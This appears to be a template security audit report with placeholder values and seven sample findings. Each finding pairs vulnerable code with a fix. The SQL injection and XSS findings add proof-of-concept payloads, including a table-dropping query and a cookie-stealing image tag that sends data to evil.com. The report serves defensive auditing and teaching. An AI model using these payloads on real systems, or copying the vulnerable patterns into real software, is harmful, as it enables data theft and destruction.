# Security Audit Report: [Project Name]

**Audit Date**: YYYY-MM-DD
**Auditor**: Claude (picky-security skill)
**Project Version**: [version/commit hash]
**Scope**: Full application security audit

---

## Executive Summary

### Overall Security Posture: [Critical/High/Medium/Low] Risk

| Category | Risk Level | Findings |
|----------|------------|----------|
| Frontend Security | 🔴/🟠/🟡/🟢 | X issues |
| Backend Security | 🔴/🟠/🟡/🟢 | X issues |
| Authentication | 🔴/🟠/🟡/🟢 | X issues |
| Authorization | 🔴/🟠/🟡/🟢 | X issues |
| API Security | 🔴/🟠/🟡/🟢 | X issues |
| Infrastructure | 🔴/🟠/🟡/🟢 | X issues |
| Data Protection | 🔴/🟠/🟡/🟢 | X issues |

### Findings by Severity

| Severity | Count |
|----------|-------|
| 🔴 Critical | X |
| 🟠 High | X |
| 🟡 Medium | X |
| 🔵 Low | X |
| **Total** | **X** |

### Top 3 Priority Items

1. **[Most Critical Issue]** - Immediate action required
2. **[Second Priority]** - Address within 24-48 hours
3. **[Third Priority]** - Address this week

---

## Critical Findings (🔴)

### [SEC-001] SQL Injection in User Search

**Severity**: Critical
**CVSS**: 9.8 (Critical)
**OWASP**: A03:2021 - Injection
**CWE**: CWE-89 - SQL Injection

**Location**:
```
File: src/api/users/search.ts
Line: 42-48
Endpoint: GET /api/users/search
```

**Vulnerable Code**:
```typescript
// VULNERABLE - User input directly in query
const results = await db.query(
  `SELECT * FROM users WHERE name LIKE '%${req.query.q}%'`
);
```

**Description**:
The search endpoint constructs SQL queries using string concatenation with unsanitized user input. An attacker can inject arbitrary SQL commands to:
- Extract all data from the database
- Modify or delete data
- Potentially gain system access

**Proof of Concept**:
```
GET /api/users/search?q='; DROP TABLE users; --
GET /api/users/search?q=' UNION SELECT password FROM users --
```

**Impact**:
- Complete database compromise
- Data theft of all user records
- Potential for privilege escalation
- Regulatory violations (GDPR, CCPA breach)

**Remediation**:
```typescript
// SECURE - Using parameterized query
const results = await db.query(
  'SELECT * FROM users WHERE name LIKE $1',
  [`%${req.query.q}%`]
);

// Or with ORM
const results = await prisma.user.findMany({
  where: {
    name: {
      contains: req.query.q,
      mode: 'insensitive'
    }
  }
});
```

**Verification**:
1. Deploy fix to staging
2. Attempt SQL injection payloads
3. Verify queries are parameterized in logs
4. Run SQLMap against endpoint

**References**:
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89](https://cwe.mitre.org/data/definitions/89.html)

---

### [SEC-002] Hardcoded Database Credentials

**Severity**: Critical
**CVSS**: 9.1 (Critical)
**OWASP**: A02:2021 - Cryptographic Failures
**CWE**: CWE-798 - Hardcoded Credentials

**Location**:
```
File: src/lib/database.ts
Line: 12-15
```

**Vulnerable Code**:
```typescript
// CRITICAL - Hardcoded production credentials
const connection = await postgres({
  host: 'prod-db.example.com',
  password: 'P@ssw0rd123!',
  user: 'admin'
});
```

**Description**:
Production database credentials are hardcoded in source code. Anyone with repository access can:
- Access production database directly
- These credentials cannot be easily rotated
- Credentials visible in git history forever

**Impact**:
- Complete database compromise
- Historical exposure (check git history)
- Insider threat risk
- Compliance violations

**Remediation**:
```typescript
// SECURE - Use environment variables
const connection = await postgres({
  host: process.env.DATABASE_HOST,
  password: process.env.DATABASE_PASSWORD,
  user: process.env.DATABASE_USER
});

// Validate env vars exist
if (!process.env.DATABASE_PASSWORD) {
  throw new Error('DATABASE_PASSWORD is required');
}
```

**Immediate Actions**:
1. Rotate database credentials NOW
2. Remove from code
3. Audit git history for exposure
4. Check for unauthorized access in DB logs

---

## High Findings (🟠)

### [SEC-003] Stored XSS in User Profile

**Severity**: High
**CVSS**: 7.5 (High)
**OWASP**: A03:2021 - Injection
**CWE**: CWE-79 - Cross-site Scripting

**Location**:
```
File: src/components/UserProfile.tsx
Line: 28
```

**Vulnerable Code**:
```tsx
// VULNERABLE - Rendering user HTML without sanitization
<div dangerouslySetInnerHTML={{ __html: user.bio }} />
```

**Description**:
User-provided biography is rendered as raw HTML. Attackers can inject JavaScript that executes in other users' browsers.

**Proof of Concept**:
```
Bio input: <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Impact**:
- Session hijacking
- Credential theft
- Malware distribution
- Defacement

**Remediation**:
```tsx
// SECURE - Use DOMPurify for sanitization
import DOMPurify from 'dompurify';

<div
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(user.bio)
  }}
/>

// Or avoid dangerouslySetInnerHTML entirely
<div>{user.bio}</div> // React auto-escapes
```

---

### [SEC-004] Missing Authentication on Admin Endpoint

**Severity**: High
**CVSS**: 8.1 (High)
**OWASP**: A01:2021 - Broken Access Control
**CWE**: CWE-285 - Improper Authorization

**Location**:
```
File: src/api/admin/users.ts
Line: 5-20
Endpoint: DELETE /api/admin/users/:id
```

**Vulnerable Code**:
```typescript
// VULNERABLE - No authentication check
export async function DELETE(req: Request, { params }) {
  await prisma.user.delete({
    where: { id: params.id }
  });
  return Response.json({ success: true });
}
```

**Description**:
Admin endpoint for deleting users has no authentication or authorization checks. Any user (or anonymous attacker) can delete arbitrary users.

**Impact**:
- Mass user deletion
- Service disruption
- Data loss
- Regulatory violations

**Remediation**:
```typescript
// SECURE - Add auth and admin check
export async function DELETE(req: Request, { params }) {
  const session = await getSession(req);

  if (!session) {
    return Response.json({ error: 'Unauthorized' }, { status: 401 });
  }

  if (session.user.role !== 'ADMIN') {
    return Response.json({ error: 'Forbidden' }, { status: 403 });
  }

  await prisma.user.delete({
    where: { id: params.id }
  });

  // Audit log
  await auditLog.create({
    action: 'USER_DELETED',
    targetId: params.id,
    performedBy: session.user.id
  });

  return Response.json({ success: true });
}
```

---

## Medium Findings (🟡)

### [SEC-005] Missing Rate Limiting on Login

**Severity**: Medium
**CVSS**: 5.3 (Medium)
**OWASP**: A07:2021 - Identification and Authentication Failures
**CWE**: CWE-307 - Improper Restriction of Excessive Authentication Attempts

**Location**: `POST /api/auth/login`

**Description**:
Login endpoint has no rate limiting, enabling:
- Brute force attacks
- Credential stuffing
- Account enumeration

**Remediation**:
```typescript
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many login attempts, please try again later'
});

app.post('/api/auth/login', loginLimiter, loginHandler);
```

---

### [SEC-006] Sensitive Data in Error Messages

**Severity**: Medium
**CVSS**: 4.3 (Medium)
**OWASP**: A05:2021 - Security Misconfiguration
**CWE**: CWE-209 - Error Message Information Disclosure

**Location**: Global error handler

**Finding**:
Stack traces and internal paths exposed in error responses.

**Remediation**:
```typescript
// Production error handler
app.use((err, req, res, next) => {
  // Log full error internally
  logger.error(err);

  // Return generic message to client
  res.status(500).json({
    error: 'An unexpected error occurred',
    requestId: req.id // For support reference
  });
});
```

---

## Low Findings (🔵)

### [SEC-007] Missing Security Headers

**Severity**: Low
**CVSS**: 3.1 (Low)
**OWASP**: A05:2021 - Security Misconfiguration
**CWE**: CWE-693 - Protection Mechanism Failure

**Missing Headers**:
- `X-Content-Type-Options`
- `X-Frame-Options`
- `Referrer-Policy`

**Remediation**:
```typescript
import helmet from 'helmet';
app.use(helmet());
```

---

## Findings by Category

### Frontend Security
| ID | Issue | Severity | Status |
|----|-------|----------|--------|
| SEC-003 | Stored XSS | High | Open |
| SEC-007 | Missing Headers | Low | Open |

### Backend Security
| ID | Issue | Severity | Status |
|----|-------|----------|--------|
| SEC-001 | SQL Injection | Critical | Open |

### Authentication
| ID | Issue | Severity | Status |
|----|-------|----------|--------|
| SEC-005 | No Rate Limiting | Medium | Open |

### Authorization
| ID | Issue | Severity | Status |
|----|-------|----------|--------|
| SEC-004 | Missing Admin Auth | High | Open |

### Infrastructure
| ID | Issue | Severity | Status |
|----|-------|----------|--------|
| SEC-002 | Hardcoded Creds | Critical | Open |

---

## OWASP Compliance Summary

| OWASP 2021 Category | Status | Findings |
|---------------------|--------|----------|
| A01: Broken Access Control | 🔴 Fail | SEC-004 |
| A02: Cryptographic Failures | 🔴 Fail | SEC-002 |
| A03: Injection | 🔴 Fail | SEC-001, SEC-003 |
| A04: Insecure Design | 🟡 Partial | - |
| A05: Security Misconfiguration | 🟡 Partial | SEC-006, SEC-007 |
| A06: Vulnerable Components | 🟢 Pass | - |
| A07: Auth Failures | 🟡 Partial | SEC-005 |
| A08: Integrity Failures | 🟢 Pass | - |
| A09: Logging Failures | 🟡 Partial | - |
| A10: SSRF | 🟢 Pass | - |

---

## Remediation Roadmap

### Immediate (24 hours)
| Priority | ID | Issue | Effort |
|----------|-----|-------|--------|
| 1 | SEC-001 | SQL Injection | 2 hours |
| 2 | SEC-002 | Hardcoded Creds | 1 hour |
| 3 | SEC-004 | Missing Admin Auth | 1 hour |

### Short-term (1 week)
| Priority | ID | Issue | Effort |
|----------|-----|-------|--------|
| 4 | SEC-003 | Stored XSS | 2 hours |
| 5 | SEC-005 | Rate Limiting | 2 hours |
| 6 | SEC-006 | Error Messages | 1 hour |

### Medium-term (1 month)
| Priority | ID | Issue | Effort |
|----------|-----|-------|--------|
| 7 | SEC-007 | Security Headers | 30 min |

---

## Appendix

### A. Audit Methodology
1. Automated scanning with pattern matching
2. Manual code review of critical paths
3. Dynamic testing where possible
4. Dependency vulnerability analysis

### B. Tools Used
- grep/ripgrep for pattern matching
- npm audit for dependency scanning
- Custom secret scanning script
- Manual code review

### C. Files Analyzed
- Total files scanned: X
- API routes: X
- Components: X
- Database models: X

### D. Out of Scope
- Physical security
- Social engineering
- Third-party services (except integration points)
- Mobile applications

### E. Scan Results
```
npm audit: X vulnerabilities (X critical, X high)
Secret scan: X potential secrets found
Pattern scan: X security anti-patterns
```

---

## Changelog

| Date | Version | Changes |
|------|---------|---------|
| YYYY-MM-DD | 1.0 | Initial audit |

---

*Generated by picky-security skill*
*OWASP Top 10 2021 | CWE/SANS Top 25*
